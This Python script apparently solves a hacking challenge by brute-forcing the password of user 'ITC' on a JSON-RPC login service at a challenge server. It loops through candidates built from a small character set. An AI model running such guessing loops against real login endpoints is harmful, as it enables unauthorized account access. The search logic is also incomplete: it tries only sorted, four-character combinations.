import itertools
import requests
import json

#Help method
url = "http://hack.israeltechallenge.com:8000/"
headers = {'content-type': 'application/json'}

payload = {
    "method": "help",
    "params": [],
    "jsonrpc": "2.0",
    "id": 0,
}
response = requests.post(
    url, data=json.dumps(payload), headers=headers).json()

print(response)

def TryPass(password):
    url = "http://hack.israeltechallenge.com:8000/"
    headers = {'content-type': 'application/json'}

    payload = {
        "method": "login",
        "params": ['ITC', password],
        "jsonrpc": "2.0",
        "id": 0,
    }
    response = requests.post(url, data=json.dumps(payload), headers=headers).json()
    return response

def TryAllPass():
    #^[k-n3-5#]{2,4}$
    chars = 'klmn345#'
    for i in range(4, 5):
        for c in itertools.combinations_with_replacement(chars, i):
            password = ''.join(c)
            print(password)
            response = TryPass(password)
            if not 'error' in response.keys():
                return response['access_code']

print(TryAllPass())
